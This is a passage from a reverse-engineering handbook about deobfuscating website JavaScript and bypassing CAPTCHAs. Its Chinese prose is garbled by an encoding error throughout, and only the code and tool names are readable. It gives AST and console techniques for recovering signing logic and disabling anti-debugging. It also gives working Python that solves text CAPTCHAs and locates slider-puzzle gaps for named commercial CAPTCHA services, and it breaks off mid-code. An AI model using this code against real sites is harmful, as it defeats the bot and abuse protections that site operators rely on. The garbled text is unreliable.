<li>åŸŸåç»‘å®š</li>
</ul>
<p><strong>éš¾åº¦</strong>: â­â­â­â­â­</p>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>
<ul>
<li>éœ€è¦æ·±å…¥ç†è§£è™šæ‹ŸæœºåŸç†ï¼ˆè§ <a href="#section-35">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a>ï¼‰</li>
<li>é€šå¸¸éœ€è¦ RPC è°ƒç”¨æˆ–å®Œæ•´æ‰£ä»£ç </li>
<li>å•†ä¸šæ··æ·†é€šå¸¸ä¸å»ºè®®å®Œå…¨è¿˜åŸï¼Œç›´æ¥ Hook æˆ– RPC æ›´é«˜æ•ˆ</li>
</ul>
<hr />
<h2>3. è‡ªåŠ¨åŒ–åæ··æ·†å·¥å…·</h2>
<h3>3.1 åœ¨çº¿å·¥å…·å¯¹æ¯”</h3>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>é“¾æ¥</th>
  <th>æ”¯æŒæ··æ·†ç±»å‹</th>
  <th>ä¼˜ç‚¹</th>
  <th>ç¼ºç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>deobfuscate.io</strong></td>
  <td>https://deobfuscate.io/</td>
  <td>obfuscator.io</td>
  <td>ä¸“é—¨é’ˆå¯¹ obfuscator.io</td>
  <td>ä»…æ”¯æŒç‰¹å®šæ··æ·†å™¨</td>
</tr>
<tr>
  <td><strong>JSNice</strong></td>
  <td>http://jsnice.org/</td>
  <td>å˜é‡åæ¢å¤</td>
  <td>AI æ¨æµ‹å˜é‡å</td>
  <td>ä¸å¤„ç†å­—ç¬¦ä¸²æ•°ç»„</td>
</tr>
<tr>
  <td><strong>Prettier</strong></td>
  <td>https://prettier.io/playground/</td>
  <td>ä»£ç æ ¼å¼åŒ–</td>
  <td>ç¾åŒ–ä»£ç ç»“æ„</td>
  <td>ä¸è§£å¯†å­—ç¬¦ä¸²</td>
</tr>
<tr>
  <td><strong>de4js</strong></td>
  <td>https://lelinhtinh.github.io/de4js/</td>
  <td>JJEncode, AAEncode, JSFuck</td>
  <td>æ”¯æŒç‰¹æ®Šç¼–ç </td>
  <td>ä¸æ”¯æŒé€šç”¨æ··æ·†</td>
</tr>
<tr>
  <td><strong>Synchrony</strong></td>
  <td>https://deobfuscate.relative.im/</td>
  <td>é€šç”¨æ··æ·†</td>
  <td>è‡ªåŠ¨è¯†åˆ«æ··æ·†ç±»å‹</td>
  <td>å‡†ç¡®ç‡ä¸€èˆ¬</td>
</tr>
</tbody>
</table>
<hr />
<h3>3.2 æœ¬åœ°å·¥å…·</h3>
<h4>Babel + AST (æ¨è)</h4>
<p><strong>å®‰è£…</strong>:</p>
<pre><code class="language-bash">npm install @babel/core @babel/parser @babel/traverse @babel/generator @babel/types
</code></pre>
<p><strong>åŸºç¡€åæ··æ·†è„šæœ¬</strong>:</p>
<pre><code class="language-javascript">const parser = require(&quot;@babel/parser&quot;);
const traverse = require(&quot;@babel/traverse&quot;).default;
const generator = require(&quot;@babel/generator&quot;).default;
const t = require(&quot;@babel/types&quot;);
const fs = require(&quot;fs&quot;);

// è¯»å–æ··æ·†ä»£ç 
const code = fs.readFileSync(&quot;obfuscated.js&quot;, &quot;utf-8&quot;);
const ast = parser.parse(code);

// 1. å¸¸é‡æŠ˜å 
traverse(ast, {
  BinaryExpression(path) {
    const result = path.evaluate();
    if (result.confident) {
      path.replaceWith(t.valueToNode(result.value));
    }
  },
});

// 2. å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸï¼ˆéœ€è¦å…ˆæ‰§è¡Œæ•°ç»„åˆå§‹åŒ–ä»£ç ï¼‰
// å…·ä½“å®ç°è§ 07-Scripts/deobfuscation_scripts.md

// 3. åˆ é™¤æ­»ä»£ç 
traverse(ast, {
  IfStatement(path) {
    const test = path.get(&quot;test&quot;).evaluate();
    if (test.confident) {
      if (test.value) {
        path.replaceWithMultiple(path.node.consequent.body);
      } else if (path.node.alternate) {
        path.replaceWith(path.node.alternate);
      } else {
        path.remove();
      }
    }
  },
});

// è¾“å‡ºç»“æœ
const output = generator(ast, {}, code);
fs.writeFileSync(&quot;deobfuscated.js&quot;, output.code);
</code></pre>
<p>è¯¦ç»†çš„ AST åæ··æ·†è„šæœ¬è§ï¼š<a href="#section-59">åæ··æ·†è„šæœ¬</a></p>
<hr />
<h4>webcrack (Webpack ä¸“ç”¨)</h4>
<pre><code class="language-bash">npm install -g webcrack
webcrack bundle.js -o output/
</code></pre>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨è¯†åˆ« Webpack æ‰“åŒ…</li>
<li>æå–æ¨¡å—ä»£ç </li>
<li>è¿˜åŸç›®å½•ç»“æ„</li>
<li>é‡å‘½åå˜é‡</li>
</ul>
<hr />
<h2>4. æ‰‹åŠ¨åæ··æ·†æŠ€å·§</h2>
<p>å½“è‡ªåŠ¨åŒ–å·¥å…·å¤±æ•ˆæ—¶ï¼Œæˆ‘ä»¬éœ€è¦&quot;æ‰‹æœ¯åˆ€&quot;å¼ç²¾å‡†æ“ä½œã€‚</p>
<h3>4.1 Chrome DevTools æŠ€å·§</h3>
<h4>é‡å‘½åç¬¦å· (Rename Symbol)</h4>
<ol>
<li>åœ¨ Sources é¢æ¿æ‰“å¼€æ··æ·†ä»£ç </li>
<li>å³é”®å˜é‡å â†’ &quot;Rename Symbol&quot;</li>
<li>è¾“å…¥æœ‰æ„ä¹‰çš„åç§°ï¼ˆå¦‚ <code>token</code>, <code>timestamp</code>ï¼‰</li>
<li>DevTools ä¼šè‡ªåŠ¨é‡å‘½åè¯¥ä½œç”¨åŸŸå†…çš„æ‰€æœ‰å¼•ç”¨</li>
</ol>
<h4>æ ¼å¼åŒ–ä»£ç  (Pretty Print)</h4>
<ul>
<li>ç‚¹å‡»å·¦ä¸‹è§’ <code>{}</code> æŒ‰é’®è‡ªåŠ¨æ ¼å¼åŒ–</li>
<li>å°†å•è¡Œä»£ç å±•å¼€ä¸ºå¤šè¡Œï¼Œä¾¿äºé˜…è¯»</li>
</ul>
<h4>æ¡ä»¶æ–­ç‚¹ (Conditional Breakpoint)</h4>
<ul>
<li>å³é”®è¡Œå· â†’ &quot;Add conditional breakpoint&quot;</li>
<li>è¾“å…¥æ¡ä»¶ï¼š<code>userId === 12345</code></li>
<li>åªåœ¨ç‰¹å®šæ¡ä»¶ä¸‹æ–­ç‚¹ï¼Œé¿å…é¢‘ç¹ä¸­æ–­</li>
</ul>
<hr />
<h3>4.2 Console REPL æŠ€å·§</h3>
<h4>æ‰§è¡Œå¹¶æ›¿æ¢</h4>
<p>é‡åˆ°å¤æ‚è¡¨è¾¾å¼ï¼Œç›´æ¥åœ¨ Console è®¡ç®—ç»“æœï¼š</p>
<pre><code class="language-javascript">// æ··æ·†ä»£ç 
var a = 0x1bb * 0x2 - 0x64;

// Console ä¸­æ‰§è¡Œ
0x1bb * 0x2 - 0x64; // è¾“å‡º: 790

// æ‰‹åŠ¨æ›¿æ¢ä¸º
var a = 790;
</code></pre>
<h4>å¯¼å‡ºå¤§æ•°ç»„</h4>
<pre><code class="language-javascript">// æ··æ·†ä»£ç ä¸­æœ‰å·¨å¤§çš„æ•°ç»„
var _0xabcd = [
  /* å‡ åƒä¸ªå…ƒç´  */
];

// Console ä¸­
copy(_0xabcd); // è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªè´´æ¿
</code></pre>
<h4>æå–è§£å¯†å‡½æ•°</h4>
<pre><code class="language-javascript">// æ··æ·†ä»£ç ä¸­çš„è§£å¯†å‡½æ•°
var _0x5678 = function (index) {
  return _0xabcd[index];
};

// åœ¨ Console ä¸­æŒ‚è½½ä¸ºå…¨å±€å‡½æ•°
window.decrypt = _0x5678;

// ç„¶åå¯ä»¥æ‰¹é‡è§£å¯†
for (let i = 0; i &lt; 10; i++) {
  console.log(i, decrypt(i));
}
</code></pre>
<hr />
<h3>4.3 æå–å’Œé‡å†™</h3>
<h4>ä¸‰å…ƒè¡¨è¾¾å¼å±•å¼€</h4>
<pre><code class="language-javascript">// æ··æ·†ä»£ç 
var result = a ? b : c ? d : e ? f : g;

// æ”¹å†™ä¸º if-else
var result;
if (a) {
  result = b;
} else if (c) {
  result = d;
} else if (e) {
  result = f;
} else {
  result = g;
}
</code></pre>
<h4>é€—å·è¡¨è¾¾å¼æ‹†åˆ†</h4>
<pre><code class="language-javascript">// æ··æ·†ä»£ç 
var a = ((b = 1), (c = 2), (d = b + c), d * 2);

// æ‹†åˆ†ä¸º
var b = 1;
var c = 2;
var d = b + c;
var a = d * 2;
</code></pre>
<hr />
<h2>5. åæ··æ·†å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1: obfuscator.io å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ</h3>
<p><strong>æ··æ·†ä»£ç </strong>:</p>
<pre><code class="language-javascript">var _0x4a5b = [&quot;aGVsbG8=&quot;, &quot;d29ybGQ=&quot;];
(function (_0x3e7a90, _0x1c9f47) {
  var _0x5d8c12 = function (_0x2f8c1d) {
    while (--_0x2f8c1d) {
      _0x3e7a90[&quot;push&quot;](_0x3e7a90[&quot;shift&quot;]());
    }
  };
  _0x5d8c12(++_0x1c9f47);
})(_0x4a5b, 0x123);
var _0x5678 = function (_0x3e7a90, _0x1c9f47) {
  // ...è§£å¯†é€»è¾‘
};

console[_0x5678(&quot;0x0&quot;)](_0x5678(&quot;0x1&quot;));
</code></pre>
<p><strong>è¿˜åŸæ­¥éª¤</strong>:</p>
<ol>
<li><p><strong>æ‰§è¡Œåˆå§‹åŒ–ä»£ç </strong>ï¼ˆåœ¨ Consoleï¼‰:</p>
<pre><code class="language-javascript">var _0x4a5b = [&quot;aGVsbG8=&quot;, &quot;d29ybGQ=&quot;];
(function (_0x3e7a90, _0x1c9f47) {
  var _0x5d8c12 = function (_0x2f8c1d) {
    while (--_0x2f8c1d) {
      _0x3e7a90[&quot;push&quot;](_0x3e7a90[&quot;shift&quot;]());
    }
  };
  _0x5d8c12(++_0x1c9f47);
})(_0x4a5b, 0x123);
</code></pre>
</li>
<li><p><strong>æ‰§è¡Œè§£å¯†å‡½æ•°</strong>:</p>
<pre><code class="language-javascript">var _0x5678 = function (_0x3e7a90, _0x1c9f47) {
  // å¤åˆ¶å®Œæ•´çš„è§£å¯†å‡½æ•°ä»£ç 
};

// æµ‹è¯•
_0x5678(&quot;0x0&quot;); // è¾“å‡º: &quot;log&quot;
_0x5678(&quot;0x1&quot;); // è¾“å‡º: &quot;hello&quot;
</code></pre>
</li>
<li><p><strong>æ‰¹é‡æ›¿æ¢</strong>:
ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æˆ– AST å·¥å…·å°†æ‰€æœ‰ <code>_0x5678('0x...')</code> æ›¿æ¢ä¸ºè§£å¯†åçš„å­—ç¬¦ä¸²</p>
</li>
</ol>
<hr />
<h3>æ¡ˆä¾‹ 2: æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ</h3>
<p><strong>æ··æ·†ä»£ç </strong>:</p>
<pre><code class="language-javascript">function checkPassword(pwd) {
  var _0x1 = &quot;2|0|3|1|4&quot;.split(&quot;|&quot;),
    _0x2 = 0;
  while (true) {
    switch (_0x1[_0x2++]) {
      case &quot;0&quot;:
        if (pwd.length &lt; 8) return false;
        continue;
      case &quot;1&quot;:
        if (!/[A-Z]/.test(pwd)) return false;
        continue;
      case &quot;2&quot;:
        var result = true;
        continue;
      case &quot;3&quot;:
        if (!/[0-9]/.test(pwd)) return false;
        continue;
      case &quot;4&quot;:
        return result;
    }
    break;
  }
}
</code></pre>
<p><strong>è¿˜åŸæ­¥éª¤</strong>:</p>
<ol>
<li><strong>è¯†åˆ«çŠ¶æ€åºåˆ—</strong>: <code>'2|0|3|1|4'</code></li>
<li><strong>æŒ‰é¡ºåºé‡ç»„ä»£ç </strong>:<pre><code class="language-javascript">function checkPassword(pwd) {
  var result = true; // case '2'
  if (pwd.length &lt; 8) return false; // case '0'
  if (!/[0-9]/.test(pwd)) return false; // case '3'
  if (!/[A-Z]/.test(pwd)) return false; // case '1'
  return result; // case '4'
}
</code></pre>
</li>
</ol>
<hr />
<h2>6. åæ··æ·†æœ€ä½³å®è·µ</h2>
<h3>6.1 æ¸è¿›å¼åæ··æ·†</h3>
<p>ä¸è¦è¯•å›¾ä¸€æ¬¡æ€§è¿˜åŸæ‰€æœ‰ä»£ç ï¼Œé‡‡ç”¨åˆ†å±‚ç­–ç•¥ï¼š</p>
<ol>
<li><strong>ç¬¬ä¸€å±‚ï¼šæ ¼å¼åŒ–</strong> - ä½¿ç”¨ Prettier ç¾åŒ–ä»£ç </li>
<li><strong>ç¬¬äºŒå±‚ï¼šå­—ç¬¦ä¸²è¿˜åŸ</strong> - è¿˜åŸå­—ç¬¦ä¸²æ•°ç»„å’Œç¼–ç </li>
<li><strong>ç¬¬ä¸‰å±‚ï¼šå¸¸é‡æŠ˜å </strong> - è®¡ç®—æ‰€æœ‰å¸¸é‡è¡¨è¾¾å¼</li>
<li><strong>ç¬¬å››å±‚ï¼šæ­»ä»£ç åˆ é™¤</strong> - ç§»é™¤æ— æ•ˆåˆ†æ”¯</li>
<li><strong>ç¬¬äº”å±‚ï¼šå˜é‡é‡å‘½å</strong> - èµ‹äºˆå˜é‡æœ‰æ„ä¹‰çš„åç§°</li>
<li><strong>ç¬¬å…­å±‚ï¼šæ§åˆ¶æµè¿˜åŸ</strong> - å¤„ç†æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆå¯é€‰ï¼‰</li>
</ol>
<h3>6.2 ä¿ç•™ä¸­é—´ç»“æœ</h3>
<p>æ¯ä¸€æ­¥éƒ½ä¿å­˜æ–‡ä»¶ï¼š</p>
<pre><code>obfuscated.js           // åŸå§‹
01_formatted.js         // æ ¼å¼åŒ–
02_strings_restored.js  // å­—ç¬¦ä¸²è¿˜åŸ
03_constants_folded.js  // å¸¸é‡æŠ˜å 
04_dead_code_removed.js // æ­»ä»£ç åˆ é™¤
05_final.js            // æœ€ç»ˆç‰ˆæœ¬
</code></pre>
<h3>6.3 éªŒè¯æ­£ç¡®æ€§</h3>
<p>æ¯æ¬¡å˜æ¢åéƒ½è¦éªŒè¯ï¼š</p>
<pre><code class="language-javascript">// åœ¨ Console ä¸­å¯¹æ¯”è¾“å‡º
eval(åŸå§‹ä»£ç ).someFunction(testInput);
eval(è¿˜åŸä»£ç ).someFunction(testInput);
// ä¸¤è€…åº”è¯¥è¿”å›ç›¸åŒç»“æœ
</code></pre>
<h3>6.4 å…³æ³¨æ ¸å¿ƒé€»è¾‘</h3>
<p>ä¸è¦æµªè´¹æ—¶é—´è¿˜åŸæ•´ä¸ªæ–‡ä»¶ï¼š</p>
<ul>
<li><strong>ç›®æ ‡æ˜ç¡®</strong>: åªè¿˜åŸåŠ å¯†/ç­¾åç›¸å…³å‡½æ•°</li>
<li><strong>é»‘ç›’è°ƒç”¨</strong>: å¯¹äºå¤æ‚çš„è¾…åŠ©å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨è€Œä¸æ˜¯ç†è§£</li>
<li><strong>RPC ç­–ç•¥</strong>: å®åœ¨æ— æ³•è¿˜åŸï¼Œè€ƒè™‘é€šè¿‡ RPC è°ƒç”¨æµè§ˆå™¨æ‰§è¡Œ</li>
</ul>
<hr />
<h2>7. å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3>Q1: AST å·¥å…·æŠ¥é”™ &quot;Cannot read property 'type'&quot;</h3>
<p><strong>åŸå› </strong>: æŸä¸ªèŠ‚ç‚¹è¢«é”™è¯¯åœ°åˆ é™¤æˆ–æ›¿æ¢</p>
<p><strong>è§£å†³</strong>: åœ¨æ›¿æ¢å‰æ£€æŸ¥èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨</p>
<pre><code class="language-javascript">if (path.node &amp;&amp; t.isIdentifier(path.node)) {
  // å®‰å…¨æ“ä½œ
}
</code></pre>
<h3>Q2: å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸåä»ç„¶æ˜¯ä¹±ç </h3>
<p><strong>åŸå› </strong>:</p>
<ul>
<li>å­—ç¬¦ä¸²ç»è¿‡å¤šé‡ç¼–ç ï¼ˆBase64 â†’ XOR â†’ ROT13ï¼‰</li>
<li>è§£å¯†å‡½æ•°ä¾èµ–è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„å¯†é’¥</li>
</ul>
<p><strong>è§£å†³</strong>:</p>
<ul>
<li>åœ¨æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œåˆå§‹åŒ–ä»£ç </li>
<li>ä½¿ç”¨ Node.js çš„ VM æ¨¡å—æ¨¡æ‹Ÿæµè§ˆå™¨ç¯å¢ƒ</li>
</ul>
<h3>Q3: æ§åˆ¶æµå¹³å¦åŒ–æ— æ³•è‡ªåŠ¨è¿˜åŸ</h3>
<p><strong>åŸå› </strong>: çŠ¶æ€è·³è½¬ä½¿ç”¨åŠ¨æ€è®¡ç®—ï¼ˆéç®€å•å­—ç¬¦ä¸²ï¼‰</p>
<p><strong>è§£å†³</strong>:</p>
<ul>
<li>æ‰‹åŠ¨è·Ÿè¸ªçŠ¶æ€è½¬ç§»</li>
<li>ä½¿ç”¨åŠ¨æ€æ’æ¡©è®°å½•å®é™…æ‰§è¡Œè·¯å¾„</li>
<li>æ¥å—éƒ¨åˆ†è¿˜åŸï¼Œå…³æ³¨å…³é”®ä»£ç å—</li>
</ul>
<h3>Q4: åæ··æ·†åä»£ç æ— æ³•è¿è¡Œ</h3>
<p><strong>åŸå› </strong>:</p>
<ul>
<li>ä¸¢å¤±äº†å¿…è¦çš„ä¸Šä¸‹æ–‡ï¼ˆé—­åŒ…å˜é‡ï¼‰</li>
<li>è‡ªæˆ‘é˜²å¾¡ä»£ç æ£€æµ‹åˆ°ä¿®æ”¹</li>
</ul>
<p><strong>è§£å†³</strong>:</p>
<ul>
<li>ä¿ç•™å®Œæ•´çš„ä½œç”¨åŸŸé“¾</li>
<li>ç¦ç”¨åè°ƒè¯•ä»£ç ï¼ˆè§ <a href="#section-26">è°ƒè¯•æŠ€å·§</a>ï¼‰</li>
</ul>
<hr />
<h2>8. å·¥å…·ä¸èµ„æº</h2>
<h3>æ¨èå·¥å…·</h3>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç”¨é€”</th>
  <th>é“¾æ¥</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>AST Explorer</strong></td>
  <td>å¯è§†åŒ– AST ç»“æ„</td>
  <td>https://astexplorer.net/</td>
</tr>
<tr>
  <td><strong>Babel REPL</strong></td>
  <td>æµ‹è¯• Babel è½¬æ¢</td>
  <td>https://babeljs.io/repl</td>
</tr>
<tr>
  <td><strong>webcrack</strong></td>
  <td>Webpack åæ··æ·†</td>
  <td>https://github.com/j4k0xb/webcrack</td>
</tr>
<tr>
  <td><strong>synchrony</strong></td>
  <td>è‡ªåŠ¨åæ··æ·†</td>
  <td>https://deobfuscate.relative.im/</td>
</tr>
</tbody>
</table>
<h3>å­¦ä¹ èµ„æº</h3>
<ul>
<li>Babel Plugin Handbook</li>
<li><a href="#section-22">AST è§£æå·¥å…·</a></li>
<li><a href="#section-59">åæ··æ·†è„šæœ¬åˆé›†</a></li>
</ul>
<hr />
<h2>9. æ€»ç»“</h2>
<p>JavaScript åæ··æ·†æ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œéœ€è¦ç»“åˆï¼š</p>
<ul>
<li><strong>å·¥å…·</strong>: è‡ªåŠ¨åŒ–å¤„ç†é‡å¤æ€§å·¥ä½œ</li>
<li><strong>æŠ€å·§</strong>: æ‰‹åŠ¨å¤„ç†ç‰¹æ®Šæƒ…å†µ</li>
<li><strong>ç»éªŒ</strong>: å¿«é€Ÿè¯†åˆ«æ··æ·†ç±»å‹å’Œæ ¸å¿ƒé€»è¾‘</li>
<li><strong>è€å¿ƒ</strong>: å¤æ‚æ··æ·†å¯èƒ½éœ€è¦æ•°å°æ—¶ä¹ƒè‡³æ•°å¤©</li>
</ul>
<p><strong>æ ¸å¿ƒåŸåˆ™</strong>:</p>
<ol>
<li>ä¸è¦è¿½æ±‚å®Œç¾è¿˜åŸï¼Œç†è§£æ ¸å¿ƒé€»è¾‘å³å¯</li>
<li>å–„ç”¨åŠ¨æ€åˆ†æï¼Œç»“åˆé™æ€åæ··æ·†</li>
<li>å»ºç«‹è‡ªå·±çš„å·¥å…·åº“å’Œè„šæœ¬é›†</li>
<li>ä¿æŒå­¦ä¹ ï¼Œæ··æ·†æŠ€æœ¯åœ¨ä¸æ–­æ¼”è¿›</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-22">AST è§£æå·¥å…·</a></li>
<li><a href="#section-59">åæ··æ·†è„šæœ¬</a></li>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
<li><a href="#section-35">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a></li>
<li><a href="#section-30">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-33">
                                                <h2>[R32] CAPTCHA Bypass</h2>
                                                <h1>R32: éªŒè¯ç  (CAPTCHA) ç»•è¿‡</h1>
<h2>æ¦‚è¿°</h2>
<p>CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) æ˜¯åŒºåˆ†äººç±»å’Œæœºå™¨äººçš„å›¾çµæµ‹è¯•ã€‚ä»æœ€æ—©çš„æ–‡å­—è¾“å…¥ï¼Œåˆ°åæ¥çš„æ»‘å—æ‹¼å›¾ï¼Œå†åˆ°ç°åœ¨çš„ç‚¹é€‰ã€è¡Œä¸ºåˆ†æå’Œæ— æ„ŸéªŒè¯ï¼ŒéªŒè¯ç æŠ€æœ¯åœ¨ä¸æ–­æ¼”è¿›ã€‚</p>
<p><strong>é€†å‘éªŒè¯ç çš„æ ¸å¿ƒ</strong>ï¼šç†è§£éªŒè¯é€»è¾‘ã€è¯†åˆ«å›¾åƒå†…å®¹ã€æ¨¡æ‹Ÿäººç±»è¡Œä¸ºã€‚</p>
<p><strong>æŠ€æœ¯è·¯çº¿</strong>ï¼š</p>
<ol>
<li><strong>è¯†åˆ«</strong> (Recognition)ï¼šOCRã€æ·±åº¦å­¦ä¹ ã€ç¼ºå£æ£€æµ‹</li>
<li><strong>æ¨¡æ‹Ÿ</strong> (Simulation)ï¼šè½¨è¿¹ç”Ÿæˆã€è¡Œä¸ºä¼ªé€ </li>
<li><strong>ç ´è§£</strong> (Bypass)ï¼šåè®®åˆ†æã€å‚æ•°ä¼ªé€ </li>
<li><strong>å¤–åŒ…</strong> (Outsource)ï¼šæ‰“ç å¹³å°ã€äººå·¥æ‰“ç </li>
</ol>
<hr />
<h2>1. éªŒè¯ç ç±»å‹åˆ†ç±»</h2>
<h3>1.1 æ–‡å­—éªŒè¯ç  (Text-based CAPTCHA)</h3>
<h4>ç‰¹å¾</h4>
<ul>
<li>æ‰­æ›²å˜å½¢çš„å­—æ¯/æ•°å­—</li>
<li>æ·»åŠ å™ªç‚¹ã€å¹²æ‰°çº¿</li>
<li>èƒŒæ™¯å¤æ‚åŒ–</li>
</ul>
<h4>éš¾åº¦ç­‰çº§</h4>
<table>
<thead>
<tr>
  <th>ç±»å‹</th>
  <th>ç¤ºä¾‹</th>
  <th>éš¾åº¦</th>
  <th>è¯†åˆ«ç‡</th>
</tr>
</thead>
<tbody>
<tr>
  <td>ç®€å•æ•°å­—</td>
  <td>1234</td>
  <td>â­</td>
  <td>95%+</td>
</tr>
<tr>
  <td>å­—æ¯+æ•°å­—</td>
  <td>A3bC</td>
  <td>â­â­</td>
  <td>85%+</td>
</tr>
<tr>
  <td>å¸¦å™ªç‚¹</td>
  <td>![å™ªç‚¹éªŒè¯ç ]</td>
  <td>â­â­â­</td>
  <td>70%+</td>
</tr>
<tr>
  <td>ä¸¥é‡æ‰­æ›²</td>
  <td>![æ‰­æ›²éªŒè¯ç ]</td>
  <td>â­â­â­â­</td>
  <td>50%+</td>
</tr>
</tbody>
</table>
<h4>è¯†åˆ«æŠ€æœ¯</h4>
<ul>
<li><strong>ä¼ ç»Ÿ OCR</strong>: Tesseract (æ•ˆæœä¸€èˆ¬)</li>
<li><strong>ä¸“ç”¨å·¥å…·</strong>: ddddocr (å›½å†…éªŒè¯ç æ•ˆæœæä½³)</li>
<li><strong>æ·±åº¦å­¦ä¹ </strong>: CNN åˆ†ç±»å™¨ï¼ˆéœ€è¦è®­ç»ƒæ•°æ®ï¼‰</li>
</ul>
<p><strong>ddddocr ä½¿ç”¨ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">import ddddocr
import base64

ocr = ddddocr.DdddOcr()

# æ–¹æ³•1: è¯»å–å›¾ç‰‡æ–‡ä»¶
with open('captcha.png', 'rb') as f:
    image = f.read()
result = ocr.classification(image)
print(result)  # è¾“å‡º: &quot;1234&quot;

# æ–¹æ³•2: Base64 å­—ç¬¦ä¸²
image_base64 = &quot;data:image/png;base64,iVBORw0K...&quot;
image_bytes = base64.b64decode(image_base64.split(',')[1])
result = ocr.classification(image_bytes)
</code></pre>
<hr />
<h3>1.2 æ»‘å—éªŒè¯ç  (Slider CAPTCHA)</h3>
<h4>1.2.1 æ‹¼å›¾æ»‘å—</h4>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>ä¸€å¼ èƒŒæ™¯å›¾</li>
<li>ä¸€ä¸ªæ»‘å—ï¼ˆæ‹¼å›¾ç¢ç‰‡ï¼‰</li>
<li>éœ€è¦æ»‘åŠ¨åˆ°æ­£ç¡®ä½ç½®å®Œæˆæ‹¼å›¾</li>
</ul>
<p><strong>ä»£è¡¨äº§å“</strong>:</p>
<ul>
<li>æéªŒ (GeeTest)</li>
<li>ç½‘æ˜“æ˜“ç›¾</li>
<li>è…¾è®¯é˜²æ°´å¢™</li>
</ul>
<p><strong>è¯†åˆ«åŸç†</strong>: ç¼ºå£æ£€æµ‹</p>
<p><strong>å®Œæ•´ç ´è§£æµç¨‹</strong>:</p>
<pre><code class="language-python">import ddddocr
import requests
from io import BytesIO
from PIL import Image

# 1. è·å–éªŒè¯ç å›¾ç‰‡
bg_url = &quot;https://example.com/captcha/bg.jpg&quot;
slider_url = &quot;https://example.com/captcha/slider.png&quot;

bg_img = Image.open(BytesIO(requests.get(bg_url).content))
slider_img = Image.open(BytesIO(requests.get(slider_url).content))

# 2. ä½¿ç”¨ ddddocr è¿›è¡Œç¼ºå£æ£€æµ‹
det = ddddocr.DdddOcr(det=True)  # å¼€å¯ç›®æ ‡æ£€æµ‹æ¨¡å¼

# å°†å›¾ç‰‡è½¬ä¸ºå­—èŠ‚
bg_bytes = BytesIO()
bg_img.save(bg_bytes, format='PNG')
bg_bytes = bg_bytes.getvalue()

# æ£€æµ‹ç¼ºå£ä½ç½®
result = det.detection(bg_bytes)
print(result)  # è¾“å‡º: {'target': [x, y, width, height]}

# 3. è®¡ç®—éœ€è¦æ»‘åŠ¨çš„è·ç¦»
gap_x = result['target'][0]  # ç¼ºå£çš„ x åæ ‡

# 4. ç”Ÿæˆæ»‘åŠ¨è½¨è¿¹ï¼ˆè§ä¸‹æ–‡ï¼‰
trajectory = generate_trajectory(gap_x)

# 5. æäº¤éªŒè¯
# (å…·ä½“å®ç°è§ä¸‹æ–‡è½¨è¿¹æ¨¡æ‹Ÿç« èŠ‚)
</code></pre>
<p><strong>OpenCV ç¼ºå£æ£€æµ‹</strong>:</p>
<pre><code class="language-python">import cv2
import numpy as np

def find_gap(bg_img, slider_img):
    &quot;&quot;&quot;ä½¿ç”¨ OpenCV æ¨¡æ¿åŒ¹é…æ‰¾ç¼ºå£&quot;&quot;&quot;

    # è½¬ç°åº¦å›¾
    bg_gray = cv2.cvtColor(np.array(bg_img), cv2.COLOR_BGR2GRAY)
    slider_gray = cv2.cvtColor(np.array(slider_img), cv2.COLOR_BGR2GRAY)

    # è¾¹ç¼˜æ£€æµ‹
    bg_edges = cv2.Canny(bg_gray, 100, 200)
    slider_edges = cv2.Canny(slider_gray, 100, 200)

    # æ¨¡æ¿åŒ¹é…
    result = cv2.matchTemplate(bg_edges, slider_edges, cv2.TM_CCOEFF_NORMED)
    min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)

    # è¿”å›æœ€ä½³åŒ¹é…ä½ç½®
    return max_loc[0]  # x åæ ‡

gap_x = find_gap(bg_img, slider_img)
print(f&quot;ç¼ºå£ä½ç½®: {gap_x}px&quot;)
</code></pre>
<hr />
<h4>1.2.2 æ—‹è½¬æ»‘å—</h4>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>åœ†å½¢å›¾ç‰‡è¢«æ—‹è½¬æ‰“ä¹±</li>
<li>æ»‘åŠ¨æ»‘å—æ—‹è½¬å›¾ç‰‡ï¼Œä½¿å…¶å½’ä½</li>
</ul>
<p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>
<ol>
<li><strong>ç‰¹å¾æå–</strong>: SIFT/ORB ç‰¹å¾ç‚¹åŒ¹é…</li>
<li><strong>è§’åº¦è®¡ç®—</strong>: è®¡ç®—æ—‹è½¬è§’åº¦</li>
<li><strong>æ»‘åŠ¨æ˜ å°„</strong>: å°†è§’åº¦æ˜ å°„ä¸ºæ»‘åŠ¨è·ç¦»</li>
</ol>
<pre><code class="language-python">import cv2

def find_rotation_angle(original_img, rotated_img):
    &quot;&quot;&quot;è®¡ç®—æ—‹è½¬è§’åº¦&quot;&quot;&quot;

    # ä½¿ç”¨ ORB ç‰¹å¾æ£€æµ‹
